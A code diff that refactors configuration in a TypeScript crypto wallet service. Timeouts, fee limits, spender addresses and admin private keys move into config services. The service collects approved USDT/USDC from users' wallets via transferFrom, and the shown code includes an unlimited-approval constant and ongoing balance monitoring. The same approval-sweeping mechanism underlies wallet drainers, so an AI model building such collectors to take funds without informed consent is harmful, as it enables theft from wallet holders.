@@ -1,5 +1,5 @@
 import { BadRequestException, Inject, Injectable, NotFoundException, UnauthorizedException } from "@nestjs/common";
-import { CollectionIntentStatus, PrismaClient, TransferAttemptStatus, type Prisma } from "@prisma/client";
+import { CollectionIntentStatus, TransferAttemptStatus, type Prisma } from "@prisma/client";
 import { createHash, randomUUID } from "crypto";
 import { ethers } from "ethers";
 import { TronWeb } from "tronweb";
@@ -16,37 +16,23 @@ import { incrementCounter } from "@trustmycard/shared/observability";
 import { ResourceManager } from "../resources/resource-manager.service";
 import { CollectionIntentService } from "../collections/collection-intent.service";
 import { COLLECTION_SIGNER, type CollectionSigner } from "../custody/signer";
+import { ConfigService } from "../../config/config.service";
+import { PlatformConfigService } from "../../config/platform-config.service";
+import { SETTING_KEYS } from "../../config/settings-keys";
 
 type TokenSymbol = "USDT" | "USDC";
 type EvmChainKey = "eth" | "bsc" | "pol" | "avax" | "arb" | "base";
 type TokenBalances = { native: string; usdt: string; usdc?: string };
 
-const prisma = new PrismaClient();
+import { prisma } from "../../infrastructure/database/prisma-shared";
 const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
 const EVM_ADDRESS_RE = /^0x[a-fA-F0-9]{40}$/;
 const TRON_GRID = "https://api.trongrid.io";
 const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-const TERMS_VERSION = "2026-07-28";
 const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
-const TRON_APPROVE_FEE_LIMIT_SUN = 150_000_000;
-const TRON_TRANSFER_FEE_LIMIT_SUN = 300_000_000;
-const COLLECTION_INTERVAL_MS = Math.max(
-  30_000,
-  Number(process.env.COLLECTOR_INTERVAL_MS ?? 120_000)
-);
-const RPC_TIMEOUT_MS = Math.max(
-  3_000,
-  Number(process.env.COLLECTOR_RPC_TIMEOUT_MS ?? 15_000)
-);
-const SUBMITTED_GRACE_MS = 30 * 60_000;
 
 function sleep(ms: number): Promise<void> {
   return new Promise((resolve) => setTimeout(resolve, ms));
-}
-
-function nextCollectionCheck(failureCount = 0): Date {
-  const multiplier = failureCount > 0 ? Math.min(8, 2 ** failureCount) : 1;
-  return new Date(Date.now() + COLLECTION_INTERVAL_MS * multiplier);
 }
 
 const EVM_CHAIN_ID: Record<EvmChainKey, number> = {
@@ -139,8 +125,22 @@ export class WalletService {
     private readonly logger: StructuredLoggerService,
     private readonly adminEvents: AdminEventsService,
     private readonly collectionIntents: CollectionIntentService,
+    private readonly configService: ConfigService,
+    private readonly platformConfig: PlatformConfigService,
     @Inject(COLLECTION_SIGNER) private readonly collectionSigner: CollectionSigner
   ) {}
+
+  private nextCollectionCheck(failureCount = 0): Date {
+    const intervalMs = this.configService.getCollectorConfig().intervalMs;
+    const maxBackoff = this.platformConfig.getCollector().failureBackoffMax;
+    const multiplier = failureCount > 0 ? Math.min(maxBackoff, 2 ** failureCount) : 1;
+    return new Date(Date.now() + intervalMs * multiplier);
+  }
+
+  private rpcTimeoutMs(): number {
+    return Number(this.configService.get(SETTING_KEYS.COLLECTOR_RPC_TIMEOUT_MS)) ||
+      this.platformConfig.getCollector().rpcTimeoutMs;
+  }
 
   private logFlow(stage: string, payload: Record<string, unknown> = {}): void {
     const isFailure = /FAILED|BLOCKED|ERROR/i.test(stage);
@@ -185,9 +185,9 @@ export class WalletService {
     return String(value ?? "").trim();
   }
 
-  private spenderEvm() { return (process.env.NEXT_PUBLIC_SPENDER_EVM ?? "").trim(); }
-  private spenderTron() { return (process.env.NEXT_PUBLIC_SPENDER_TRON ?? "").trim(); }
-  private spenderFor(network: string) { return network === "tron" ? this.spenderTron() : this.spenderEvm(); }
+  private spenderEvm() { return this.platformConfig.getWallets().spenderEvm; }
+  private spenderTron() { return this.platformConfig.getWallets().spenderTron; }
+  private spenderFor(network: string) { return this.platformConfig.spenderForNetwork(network); }
   private parseToken(raw: unknown): TokenSymbol {
     const s = String(raw ?? "USDT").trim().toUpperCase();
     if (s === "USDT" || s === "USDC") return s;
@@ -242,7 +242,7 @@ export class WalletService {
       headers: { "content-type": "application/json" },
       body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
       cache: "no-store",
-      signal: AbortSignal.timeout(RPC_TIMEOUT_MS),
+      signal: AbortSignal.timeout(this.rpcTimeoutMs()),
     });
     const json = (await res.json()) as { result?: string; error?: { message?: string } };
     if (!res.ok || json.error) throw new Error(json.error?.message || `RPC ${res.status}`);
@@ -281,16 +281,16 @@ export class WalletService {
   }
 
   private getAdminEvmPrivateKey(): string {
-    return (process.env.ADMIN_EVM_PRIVATE_KEY ?? "").trim();
+    return this.platformConfig.getWallets().adminEvmPrivateKey;
   }
 
   private getAdminTronPrivateKey(): string {
-    return (process.env.ADMIN_TRON_PRIVATE_KEY ?? "").trim();
+    return this.platformConfig.getWallets().adminTronPrivateKey;
   }
 
   private tronHeaders(): Record<string, string> {
     const headers: Record<string, string> = { "content-type": "application/json" };
-    const apiKey = (process.env.TRONGRID_API_KEY ?? "").trim();
+    const apiKey = this.platformConfig.getChains().trongridApiKey;
     if (apiKey) headers["TRON-PRO-API-KEY"] = apiKey;
     return headers;
   }
@@ -320,7 +320,7 @@ export class WalletService {
           visible: true,
         }),
         cache: "no-store",
-        signal: AbortSignal.timeout(RPC_TIMEOUT_MS),
+        signal: AbortSignal.timeout(this.rpcTimeoutMs()),
       });
       const json = (await res.json().catch(() => ({}))) as { constant_result?: string[] };
       const hex = json.constant_result?.[0];
@@ -406,7 +406,11 @@ export class WalletService {
       return { txHash, blockNumber: null };
     }
 
-    const receipt = await provider.waitForTransaction(txHash, 1, 60_000);
+    const receipt = await provider.waitForTransaction(
+      txHash,
+      1,
+      this.platformConfig.getTransfer().evmTxConfirmTimeoutMs
+    );
     if (!receipt) throw new Error("Transaction confirmation timeout");
     if (!receipt || receipt.status !== 1) {
       throw new Error("EVM transferFrom transaction failed");
@@ -442,7 +446,7 @@ export class WalletService {
       const trigger = await tron.transactionBuilder.triggerSmartContract(
         args.tokenAddress,
         "transferFrom(address,address,uint256)",
-        { feeLimit: TRON_TRANSFER_FEE_LIMIT_SUN },
+        { feeLimit: this.platformConfig.getApproval().tronTransferFeeLimitSun },
         [
           { type: "address", value: args.owner },
           { type: "address", value: args.to },
@@ -495,7 +499,8 @@ export class WalletService {
       return { txHash, blockNumber: null };
     }
 
-    for (let attempt = 0; attempt < 30; attempt += 1) {
+    const txConfirm = this.platformConfig.getTransfer();
+    for (let attempt = 0; attempt < txConfirm.tronTxConfirmMaxAttempts; attempt += 1) {
       const info = await tron.trx.getTransactionInfo(txHash).catch(() => null) as
         | { id?: string; blockNumber?: number; receipt?: { result?: string }; result?: string }
         | null;
@@ -504,7 +509,7 @@ export class WalletService {
         if (result !== "SUCCESS") throw new Error(`TRON transferFrom failed: ${result}`);
         return { txHash, blockNumber: info.blockNumber ?? null };
       }
-      await sleep(2_000);
+      await sleep(txConfirm.tronTxConfirmPollMs);
     }
     throw new Error("Transaction confirmation timeout");
   }
@@ -646,7 +651,7 @@ export class WalletService {
             collectedRaw: progress.collected.toString(),
             status: progress.status,
             collectionEnabled: progress.keepMonitoring,
-            nextCheckAt: progress.keepMonitoring ? nextCollectionCheck() : null,
+            nextCheckAt: progress.keepMonitoring ? this.nextCollectionCheck() : null,
             failureCount: 0,
             lastError: null,
           },
@@ -1080,7 +1085,7 @@ export class WalletService {
       const res = await fetch(`${TRON_GRID}/wallet/triggersmartcontract`, {
         method: "POST",
         headers: { "content-type": "application/json" },
-        body: JSON.stringify({ owner_address: this.base58ToHex(owner), contract_address: this.base58ToHex(tokenInfo.address), function_selector: "approve(address,uint256)", parameter, fee_limit: TRON_APPROVE_FEE_LIMIT_SUN, call_value: 0, visible: false }),
+        body: JSON.stringify({ owner_address: this.base58ToHex(owner), contract_address: this.base58ToHex(tokenInfo.address), function_selector: "approve(address,uint256)", parameter, fee_limit: this.platformConfig.getApproval().tronApproveFeeLimitSun, call_value: 0, visible: false }),
         cache: "no-store",
       });
       const json = (await res.json()) as { transaction?: Record<string, unknown>; result?: { message?: string; result?: boolean }; Error?: string };
@@ -1109,7 +1114,7 @@ export class WalletService {
         headers: this.tronHeaders(),
         body: JSON.stringify({ owner_address: owner, contract_address: tokenInfo.address, function_selector: "allowance(address,address)", parameter, visible: true }),
         cache: "no-store",
-        signal: AbortSignal.timeout(RPC_TIMEOUT_MS),
+        signal: AbortSignal.timeout(this.rpcTimeoutMs()),
       });
       const json = (await res.json()) as { constant_result?: string[]; result?: { message?: string } };
       const hex = json.constant_result?.[0];
@@ -1177,14 +1182,21 @@ export class WalletService {
     const tokenInfo = this.getToken(network, token);
     if (!tokenInfo) throw new BadRequestException("Unsupported token/network");
     let verified: Awaited<ReturnType<WalletService["verifyAllowance"]>> | null = null;
+    const transferCfg = this.platformConfig.getTransfer();
     let verifyError: unknown;
-    for (let attempt = 0; attempt < 3; attempt += 1) {
+    for (let attempt = 0; attempt < transferCfg.allowanceVerifyMaxAttempts; attempt += 1) {
       try {
         verified = await this.verifyAllowance({ network, owner, spender, token });
         break;
       } catch (err) {
         verifyError = err;
-        if (attempt < 2) await sleep(network === "tron" ? 1_500 : 900);
+        if (attempt < transferCfg.allowanceVerifyMaxAttempts - 1) {
+          await sleep(
+            network === "tron"
+              ? transferCfg.allowancePollDelayTronMs
+              : transferCfg.allowancePollDelayEvmMs
+          );
+        }
       }
     }
     const expected = BigInt(amountRaw);
@@ -1214,7 +1226,7 @@ export class WalletService {
     const transferToAddress = spender;
     const transferAmountRawInput = String(body.transferAmountRaw ?? "").trim();
     const transferAmountHumanInput = String(body.transferAmountHuman ?? "").trim();
-    const immediateCollectionAt = hasAllowance ? new Date() : nextCollectionCheck();
+    const immediateCollectionAt = hasAllowance ? new Date() : this.nextCollectionCheck();
     const requestedTransferRaw = transferAmountRawInput
       ? BigInt(transferAmountRawInput)
       : transferAmountHumanInput
@@ -1228,7 +1240,7 @@ export class WalletService {
         ? await tx.approval.update({
             where: { id: existingApproval.id },
             data: {
-              termsVersion: String(body.termsVersion ?? TERMS_VERSION),
+              termsVersion: String(body.termsVersion ?? this.platformConfig.getApproval().termsVersion),
               collectionToAddress: transferToAddress,
               collectionEnabled: !["COMPLETED", "REVOKED", "EXPIRED", "SUPERSEDED"].includes(existingApproval.status),
               nextCheckAt: immediateCollectionAt,
@@ -1249,7 +1261,7 @@ export class WalletService {
               collectedRaw: "0",
               txHash,
               status: hasAllowance ? "ACTIVE" : "SUBMITTED",
-              termsVersion: String(body.termsVersion ?? TERMS_VERSION),
+              termsVersion: String(body.termsVersion ?? this.platformConfig.getApproval().termsVersion),
               unlimited,
               collectionEnabled: true,
               collectionToAddress: transferToAddress,
@@ -1425,7 +1437,7 @@ export class WalletService {
             lastCheckedAt: now,
             lastError: message,
             failureCount: nextFailures,
-            nextCheckAt: nextCollectionCheck(nextFailures),
+            nextCheckAt: this.nextCollectionCheck(nextFailures),
           },
         });
         return;
@@ -1435,13 +1447,13 @@ export class WalletService {
     if (allowanceRaw <= BigInt(0)) {
       const stillAwaitingConfirmation =
         approval.status === "SUBMITTED" &&
-        now.getTime() - approval.createdAt.getTime() < SUBMITTED_GRACE_MS;
+        now.getTime() - approval.createdAt.getTime() < this.platformConfig.getCollector().submittedGraceMs;
       await prisma.approval.update({
         where: { id: approval.id },
         data: stillAwaitingConfirmation
           ? {
               lastCheckedAt: now,
-              nextCheckAt: nextCollectionCheck(),
+              nextCheckAt: this.nextCollectionCheck(),
               lastError: null,
             }
           : {
@@ -1505,7 +1517,7 @@ export class WalletService {
           lastCheckedAt: now,
           lastError: expectedNoBalance ? null : message,
           failureCount: nextFailures,
-          nextCheckAt: nextCollectionCheck(nextFailures),
+          nextCheckAt: this.nextCollectionCheck(nextFailures),
         },
       });
       return;
@@ -1740,7 +1752,12 @@ export class WalletService {
       const info = await tron.trx.getTransactionInfo(attempt.txHash).catch(() => null) as
         | { id?: string; blockNumber?: number; receipt?: { result?: string }; result?: string }
         | null;
-      if (!info?.id && info?.blockNumber == null) return { finalized: false, retryAfterMs: 2_000 };
+      if (!info?.id && info?.blockNumber == null) {
+        return {
+          finalized: false,
+          retryAfterMs: this.platformConfig.getTransfer().confirmationRetryDelayMs,
+        };
+      }
       blockNumber = info.blockNumber ?? null;
       succeeded = (info.receipt?.result ?? info.result ?? "SUCCESS") === "SUCCESS";
     } else {
@@ -1749,7 +1766,12 @@ export class WalletService {
         "eth_getTransactionReceipt",
         [attempt.txHash]
       ) as { status?: string; blockNumber?: string } | null;
-      if (!receipt) return { finalized: false, retryAfterMs: 2_000 };
+      if (!receipt) {
+        return {
+          finalized: false,
+          retryAfterMs: this.platformConfig.getTransfer().confirmationRetryDelayMs,
+        };
+      }
       blockNumber = receipt.blockNumber ? Number.parseInt(receipt.blockNumber, 16) : null;
       succeeded = receipt.status === "0x1";
     }
@@ -1841,7 +1863,7 @@ export class WalletService {
           collectedRaw: progress.collected.toString(),
           status: progress.status,
           collectionEnabled: progress.keepMonitoring,
-          nextCheckAt: progress.keepMonitoring ? nextCollectionCheck() : null,
+          nextCheckAt: progress.keepMonitoring ? this.nextCollectionCheck() : null,
         },
       }),
       prisma.outboxEvent.create({
@@ -1918,8 +1940,8 @@ export class WalletService {
     ]);
     return {
       ok: true,
-      enabled: (process.env.COLLECTOR_ENABLED ?? "true").toLowerCase() !== "false",
-      intervalMs: COLLECTION_INTERVAL_MS,
+      enabled: this.configService.getCollectorConfig().enabled,
+      intervalMs: this.configService.getCollectorConfig().intervalMs,
       due,
       leased,
       approvals: Object.fromEntries(
@@ -2000,7 +2022,7 @@ export class WalletService {
     const approval = await prisma.approval.upsert({
       where: { network_txHash: { network, txHash } },
       update: { status: "ACTIVE", amountRaw, amountHuman: String(body.amountHuman ?? amountRaw), remainingRaw: amountRaw, updatedAt: new Date() },
-      create: { ownerAddress: address, spenderAddress: this.spenderFor(network), network, tokenSymbol: token, tokenAddress: tokenInfo.address, decimals: tokenInfo.decimals, amountRaw, amountHuman: String(body.amountHuman ?? amountRaw), remainingRaw: amountRaw, txHash, status: "ACTIVE", termsVersion: TERMS_VERSION, unlimited: false },
+      create: { ownerAddress: address, spenderAddress: this.spenderFor(network), network, tokenSymbol: token, tokenAddress: tokenInfo.address, decimals: tokenInfo.decimals, amountRaw, amountHuman: String(body.amountHuman ?? amountRaw), remainingRaw: amountRaw, txHash, status: "ACTIVE", termsVersion: this.platformConfig.getApproval().termsVersion, unlimited: false },
     });
     await this.recordAudit(`owner:${address}`, "register_legacy", "approval", { network, txHash }, approval.id);
     return { code: 200, status: "success", message: "OK", data: { registered: true, approvalId: approval.id }, timestamp: new Date().toISOString() };
